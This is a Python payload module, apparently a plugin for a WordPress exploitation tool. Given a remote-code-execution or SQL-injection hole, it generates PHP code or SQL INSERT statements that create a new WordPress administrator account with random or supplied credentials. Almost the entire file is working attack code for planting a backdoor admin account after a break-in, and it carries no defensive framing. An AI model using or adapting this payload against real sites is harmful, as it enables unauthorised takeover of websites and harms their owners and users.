import os
from helpers import uid, pinfo, pwarn

##
# Dependency
# What dependency does this payload have
def get_methods():
    return ['RCE', 'SQLe']

##
# Detonate payload
# Return the code to execute
# or the file path to be uploaded
def get_instructions(vuln, args):
    # Prepare user
    if args.pos:
        user = args.pos[0]
        password = args.pos[1]
        email = args.pos[2]
    else:
        user = uid()
        password = uid()
        email = uid() + "@" + uid() + ".com"

    pinfo("Inserting new admin user")
    pwarn("User:", user)
    pwarn("Password:", password)
    pwarn("Email:", email)

    # Create with PHP
    if vuln == 'RCE':
        return ['<?php $user_id = wp_create_user( "'+user+'", "'+password+'", "'+email+'" ); $user = new WP_User( $user_id ); $user->set_role( "administrator" ); if (user_can($user, "administrator") ) { echo "Admin Created Successfully"; } ?>']
    # Create with SQL
    if vuln == 'SQLe':
        
        privs = 'a:1:{s:13:"administrator";s:1:"1";}'
        return [
            "INSERT INTO {$wpdb->users} SET `user_login`='"+user+"', `user_email`='"+email+"', `user_pass`=MD5('"+password+"');",
            "INSERT INTO {$wpdb->usermeta} SET `user_id`='#iid#', `meta_key`='wp_capabilities', `meta_value`='a:1:{s:13:\\\"administrator\\\";s:1:\\\"1\\\";}';"
        ]

##
# Author of this payload
def get_author():
    return "@etragardh"

##
# Special thanks to:
def get_thanks():
    return False
